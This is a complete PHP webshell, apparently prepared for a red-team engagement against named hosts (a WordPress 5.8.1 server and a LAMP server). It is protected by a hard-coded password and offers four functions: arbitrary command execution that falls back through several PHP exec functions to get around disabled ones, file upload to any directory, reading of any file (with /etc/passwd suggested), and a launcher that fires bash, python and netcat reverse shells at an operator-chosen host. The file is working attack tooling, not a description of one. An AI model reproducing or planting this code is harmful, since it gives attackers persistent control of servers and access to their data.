<?php
/**
 * shell.php — Feature-rich PHP webshell
 * Targets: svc-amazin-01 (WordPress 5.8.1), svc-samba-01 (LAMP stack)
 *
 * Access:  http://<target>/shell.php?p=<PASSWORD>
 * Execute: http://<target>/shell.php?p=<PASSWORD>&c=<cmd>
 * Upload:  POST to shell.php?p=<PASSWORD>&act=upload
 * Read:    http://<target>/shell.php?p=<PASSWORD>&act=read&f=<filepath>
 */

// ── Auth ─────────────────────────────────────────────────────────────────────
define('SHELL_PASS', 'rt2025!delta');   // Change before deploying
$given = $_REQUEST['p'] ?? '';
if (!hash_equals(SHELL_PASS, $given)) {
    header('HTTP/1.0 404 Not Found');
    exit('Not Found');
}

$act = $_REQUEST['act'] ?? 'cmd';
$cmd = $_REQUEST['c']   ?? '';
$f   = $_REQUEST['f']   ?? '';

// ── Helpers ──────────────────────────────────────────────────────────────────
function runcmd($c) {
    foreach (['system','shell_exec','exec','passthru','popen'] as $fn) {
        if (function_exists($fn) && !in_array($fn, array_map('trim', explode(',', ini_get('disable_functions'))))) {
            if ($fn === 'system')     { ob_start(); system($c); return ob_get_clean(); }
            if ($fn === 'shell_exec') { return shell_exec($c); }
            if ($fn === 'exec')       { exec($c, $o); return implode("\n", $o); }
            if ($fn === 'passthru')   { ob_start(); passthru($c); return ob_get_clean(); }
            if ($fn === 'popen')      { $h=popen($c,'r'); $r=''; while(!feof($h))$r.=fread($h,4096); pclose($h); return $r; }
        }
    }
    // proc_open fallback
    if (function_exists('proc_open')) {
        $spec = [['pipe','r'],['pipe','w'],['pipe','w']];
        $p = proc_open($c, $spec, $pipes);
        if ($p) {
            fclose($pipes[0]);
            $r = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            proc_close($p);
            return $r;
        }
    }
    return '[!] All exec methods disabled';
}

header('Content-Type: text/html; charset=utf-8');
$cwd = getcwd();
$whoami = trim(runcmd('whoami'));
$hostname = trim(runcmd('hostname'));
?>
<!DOCTYPE html><html><head><title>~</title>
<style>
body{background:#1a1a1a;color:#00ff41;font-family:monospace;font-size:13px;padding:20px}
pre{background:#0d0d0d;padding:10px;border:1px solid #333;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto}
input,textarea{background:#0d0d0d;color:#00ff41;border:1px solid #444;padding:4px;font-family:monospace}
input[type=text]{width:60%} input[type=submit]{cursor:pointer;color:#ff4444}
a{color:#ffaa00} .dim{color:#555}
</style></head><body>
<pre>
[<?= htmlspecialchars($whoami) ?>@<?= htmlspecialchars($hostname) ?>] <?= htmlspecialchars($cwd) ?>

PHP <?= phpversion() ?> | OS: <?= PHP_OS ?> | Disabled: <?= ini_get('disable_functions') ?: 'none' ?>
</pre>

<?php if ($act === 'cmd'): ?>
<!-- ── Command execution ── -->
<form method="post">
<input type="hidden" name="p" value="<?= htmlspecialchars(SHELL_PASS) ?>">
<input type="text" name="c" value="<?= htmlspecialchars($cmd) ?>" placeholder="command..." autofocus>
<input type="submit" value="exec">
</form>
<?php if ($cmd): ?>
<pre><?= htmlspecialchars(runcmd($cmd)) ?></pre>
<?php endif; ?>

<?php elseif ($act === 'upload'): ?>
<!-- ── File upload ── -->
<?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upfile'])): ?>
    <?php
    $dest = ($_POST['dest'] ?? $cwd) . '/' . basename($_FILES['upfile']['name']);
    if (move_uploaded_file($_FILES['upfile']['tmp_name'], $dest)) {
        echo "<pre>[+] Uploaded to: " . htmlspecialchars($dest) . "</pre>";
    } else {
        echo "<pre>[-] Upload failed (check permissions)</pre>";
    }
    ?>
<?php endif; ?>
<form method="post" enctype="multipart/form-data">
<input type="hidden" name="p" value="<?= htmlspecialchars(SHELL_PASS) ?>">
<input type="hidden" name="act" value="upload">
File: <input type="file" name="upfile"><br>
Dest dir: <input type="text" name="dest" value="<?= htmlspecialchars($cwd) ?>"><br>
<input type="submit" value="upload">
</form>

<?php elseif ($act === 'read'): ?>
<!-- ── File read ── -->
<?php if ($f): ?>
<pre><?= htmlspecialchars(file_get_contents($f) ?: '[-] Cannot read ' . $f) ?></pre>
<?php endif; ?>
<form method="get">
<input type="hidden" name="p" value="<?= htmlspecialchars(SHELL_PASS) ?>">
<input type="hidden" name="act" value="read">
Path: <input type="text" name="f" value="<?= htmlspecialchars($f) ?>" placeholder="/etc/passwd">
<input type="submit" value="read">
</form>

<?php elseif ($act === 'revshell'): ?>
<!-- ── Reverse shell launcher ── -->
<?php
$rhost = $_REQUEST['rh'] ?? '';
$rport = (int)($_REQUEST['rp'] ?? 4444);
if ($rhost) {
    // Try multiple methods
    $payloads = [
        "bash -c 'bash -i >& /dev/tcp/{$rhost}/{$rport} 0>&1' &",
        "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('{$rhost}',{$rport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')\" &",
        "nc -e /bin/bash {$rhost} {$rport} &",
        "ncat -e /bin/bash {$rhost} {$rport} &",
    ];
    foreach ($payloads as $pl) {
        runcmd($pl);
    }
    echo "<pre>[+] Reverse shell payloads fired at {$rhost}:{$rport}
    Start listener: nc -lvnp {$rport}</pre>";
}
?>
<form method="post">
<input type="hidden" name="p" value="<?= htmlspecialchars(SHELL_PASS) ?>">
<input type="hidden" name="act" value="revshell">
LHOST: <input type="text" name="rh" value="<?= htmlspecialchars($rhost) ?>" size="20">
LPORT: <input type="text" name="rp" value="<?= $rport ?>" size="6">
<input type="submit" value="spawn">
</form>

<?php endif; ?>

<br><span class="dim">
[ <a href="?p=<?= SHELL_PASS ?>&act=cmd">cmd</a> ]
[ <a href="?p=<?= SHELL_PASS ?>&act=upload">upload</a> ]
[ <a href="?p=<?= SHELL_PASS ?>&act=read">read</a> ]
[ <a href="?p=<?= SHELL_PASS ?>&act=revshell">revshell</a> ]
</span>
</body></html>
